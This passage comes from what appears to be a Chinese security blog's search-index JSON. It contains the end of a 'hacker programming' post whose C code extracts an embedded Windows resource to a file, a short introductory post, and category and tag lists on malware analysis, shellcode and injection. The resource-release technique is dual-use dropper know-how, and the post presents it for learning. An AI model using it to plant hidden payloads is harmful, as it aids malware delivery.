MessageBox(NULL, L&quot;获取字节数失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //装载资源 HGLOBAL hGlobal = LoadResource(NULL, hRes); if (hGlobal == NULL) &#123; MessageBox(NULL, L&quot;装载资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //锁定资源 LPVOID lPvoid = LockResource(hGlobal); if(lPvoid == NULL)&#123; MessageBox(NULL, L&quot;锁定资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //开始释放资源 FILE* fp; fopen_s(&amp;fp, lpszSaveFileName, &quot;wb+&quot;);//wb+读写打开或建立一个二进制文件，允许读和写 if (fp == NULL) &#123; MessageBox(NULL, L&quot;写入资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; fwrite(lPvoid, sizeof(char), dwSize, fp); fclose(fp); return TRUE;&#125;int main()&#123; printf(&quot;按下回车键开始释放资源\\n&quot;); getchar(); BOOL FLAG=FreeRes(IDR_MYRES2,TEXT(&quot;MYRES&quot;),&quot;free.txt&quot;); if (FLAG == TRUE) &#123; printf(&quot;释放成功\\n&quot;); &#125; else printf(&quot;释放失败\\n&quot;); getchar();&#125; 查看free.txt内容 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}]},{"title":"写在前面的话","slug":"写在前面的话","date":"2021-07-08T03:50:10.000Z","updated":"2021-07-08T09:40:20.968Z","comments":true,"path":"2021/07/08/写在前面的话/","link":"","permalink":"https://b1ackie.cn/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/","excerpt":"","text":"一直都在说要写博客，但是一直都没有很好的坚持下来，上次写博客还是大二的时候，这都过去好久了。 现在自己也搭建了一个博客，希望能够好好坚持下去吧，作为日常的学习记录，也希望能够写出一些有价值的东西。 最后的最后，我是不知名小团队satter的b1ackie。","categories":[],"tags":[]}],"categories":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"},{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/categories/PWN/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Go语言学习","slug":"Go语言学习","permalink":"https://b1ackie.cn/categories/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"攻防世界writeup","slug":"攻防世界writeup","permalink":"https://b1ackie.cn/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwriteup/"},{"name":"学习记录","slug":"学习记录","permalink":"https://b1ackie.cn/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"name":"0day安全：软件漏洞分析技术","slug":"0day安全：软件漏洞分析技术","permalink":"https://b1ackie.cn/categories/0day%E5%AE%89%E5%85%A8%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/"},{"name":"DLL劫持","slug":"DLL劫持","permalink":"https://b1ackie.cn/categories/DLL%E5%8A%AB%E6%8C%81/"},{"name":"虚拟机检测","slug":"虚拟机检测","permalink":"https://b1ackie.cn/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"},{"name":"YARA","slug":"YARA","permalink":"https://b1ackie.cn/categories/YARA/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"},{"name":"HOOK技术","slug":"HOOK技术","permalink":"https://b1ackie.cn/categories/HOOK%E6%8A%80%E6%9C%AF/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ackie.cn/categories/ShellCode/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"MFC","slug":"MFC","permalink":"https://b1ackie.cn/tags/MFC/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://b1ackie.cn/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"宏病毒","slug":"宏病毒","permalink":"https://b1ackie.cn/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"},{"name":"Macro 4.0","slug":"Macro-4-0","permalink":"https://b1ackie.cn/tags/Macro-4-0/"},{"name":"Go语言","slug":"Go语言","permalink":"https://b1ackie.cn/tags/Go%E8%AF%AD%E8%A8%80/"},{"name":"ROP","slug":"ROP","permalink":"https://b1ackie.cn/tags/ROP/"},{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/tags/PWN/"},{"name":"CTF","slug":"CTF","permalink":"https://b1ackie.cn/tags/CTF/"},{"name":"RE","slug":"RE","permalink":"https://b1ackie.cn/tags/RE/"},{"name":"GDB","slug":"GDB","permalink":"https://b1ackie.cn/tags/GDB/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://b1ackie.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"ELF","slug":"ELF","permalink":"https://b1ackie.cn/tags/ELF/"},{"name":"GCC编译原理","slug":"GCC编译原理","permalink":"https://b1ackie.cn/tags/GCC%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"name":"漏洞","slug":"漏洞","permalink":"https://b1ackie.cn/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"DLL劫持","slug":"DLL劫持","permalink":"https://b1ackie.cn/tags/DLL%E5%8A%AB%E6%8C%81/"},{"name":"虚拟机检测","slug":"虚拟机检测","permalink":"https://b1ackie.cn/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"},{"name":"编程","slug":"编程","permalink":"https://b1ackie.cn/tags/%E7%BC%96%E7%A8%8B/"},{"name":"YARA","slug":"YARA","permalink":"https://b1ackie.cn/tags/YARA/"},{"name":"恶意代码检测","slug":"恶意代码检测","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"},{"name":"CVE-2021-40444","slug":"CVE-2021-40444","permalink":"https://b1ackie.cn/tags/CVE-2021-40444/"},{"name":"shellcode","slug":"shellcode","permalink":"https://b1ackie.cn/tags/shellcode/"},{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"功能技术","slug":"功能技术","permalink":"https://b1ackie.cn/tags/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF/"},{"name":"熊猫烧香","slug":"熊猫烧香","permalink":"https://b1ackie.cn/tags/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"},{"name":"传输技术","slug":"传输技术","permalink":"https://b1ackie.cn/tags/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF/"},{"name":"SOCKET编程","slug":"SOCKET编程","permalink":"https://b1ackie.cn/tags/SOCKET%E7%BC%96%E7%A8%8B/"},{"name":"压缩技术","slug":"压缩技术","permalink":"https://b1ackie.cn/tags/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ackie.cn/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"},{"name":"Inline Hook","slug":"Inline-Hook","permalink":"https://b1ackie.cn/tags/Inline-Hook/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ackie.cn/tags/ShellCode/"},{"name":"提权技术","slug":"提权技术","permalink":"https://b1ackie.cn/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"},{"name":"UAC","slug":"UAC","permalink":"https://b1ackie.cn/tags/UAC/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ackie.cn/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ackie.cn/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"PE","slug":"PE","permalink":"https://b1ackie.cn/tags/PE/"},{"name":"注入","slug":"注入","permalink":"https://b1ackie.cn/tags/%E6%B3%A8%E5%85%A5/"},{"name":"HOOK","slug":"HOOK","permalink":"https://b1ackie.cn/tags/HOOK/"}]}